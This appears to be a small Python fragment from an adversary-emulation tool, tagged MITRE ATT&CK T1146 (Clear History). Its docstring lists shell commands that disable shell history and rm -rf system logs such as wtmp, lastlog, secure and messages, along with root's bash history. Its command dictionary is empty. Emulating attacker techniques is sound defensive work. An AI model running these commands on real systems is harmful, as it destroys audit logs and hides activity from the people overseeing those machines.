'''
    MITRE ATT&CK T1146: Clear History
    https://attack.mitre.org/techniques/T1146/

unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; 
history -n
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
rm -rf /var/log/wtmp
rm -rf /var/log/lastlog
rm -rf /var/log/secure
rm -rf /var/log/xferlog
rm -rf /var/log/messages
rm -rf /var/run/utmp
rm -rf /var/log/maillog
rm -rf /root/.bash_history
touch /root/.bash_history 
history -r

history -c
'''

clearHistory = {
    'commands': [
        [''],
        ['']
    ]
}